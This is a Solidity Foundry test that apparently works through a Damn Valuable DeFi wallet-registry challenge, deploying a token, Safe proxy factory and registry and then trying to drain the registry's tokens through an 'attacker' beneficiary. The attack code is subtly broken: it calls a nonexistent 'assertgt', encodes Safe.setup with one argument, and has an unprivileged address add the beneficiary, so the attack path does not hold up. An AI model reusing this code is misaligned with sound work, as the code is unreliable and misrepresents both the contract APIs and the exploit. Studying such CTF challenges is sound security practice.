contract WalletRegistryExploit is Test {
    DamnValuableToken public token;
    address public deployer;
    address public attacker;
    address public owner;
    Safe public singletonCopy;
    SafeProxyFactory public walletFactory;
    WalletRegistry public walletRegistry;

    function setUp() public {
        deployer = address(0x1);
        attacker = address(0x2);
        owner = address(0x3);

        vm.startPrank(deployer);

        token = new DamnValuableToken();
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();
        // Using empty array for users as constructor argument (exact usage unknown but harmless)
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), new address[](0));

        // Fund registry with tokens to enable draining
        token.transfer(address(walletRegistry), 1000 ether);

        vm.stopPrank();
    }

    function testExploit_DrainRegistryViaBeneficiary() public {
        uint256 initialRegistryBalance = token.balanceOf(address(walletRegistry));

        // Step 1: Owner adds attacker as beneficiary
        vm.startPrank(owner);
        walletRegistry.addBeneficiary(attacker);
        vm.stopPrank();

        // Step 2: Prepare initializer data for Safe.setup(attacker)
        bytes memory initializer = abi.encodeWithSelector(
            singletonCopy.setup.selector, // Selector for Safe.setup(address)
            attacker
        );

        // Step 3: Trigger wallet creation for attacker via factory (anyone can call)
        vm.startPrank(deployer); // Using deployer as caller for simplicity
        address proxy = walletFactory.createProxy(singletonCopy, initializer);
        vm.stopPrank();

        // Step 4: Retrieve wallet address from registry
        address wallet = walletRegistry.wallets(attacker);
        assertEq(wallet, proxy, "Wallet mismatch");

        // Step 5: Verify token transfer occurred
        uint256 finalRegistryBalance = token.balanceOf(address(walletRegistry));
        uint256 walletBalance = token.balanceOf(wallet);
        uint256 amountTransferred = initialRegistryBalance - finalRegistryBalance;

        assertEq(amountTransferred, walletBalance, "Token transfer mismatch");
        assertgt(amountTransferred, 0, "No tokens transferred");

        // Step 6: Confirm beneficiary flag reset after transfer
        assertFalse(
            walletRegistry.beneficiaries(attacker),
            "Beneficiary flag not reset"
        );
    }
}

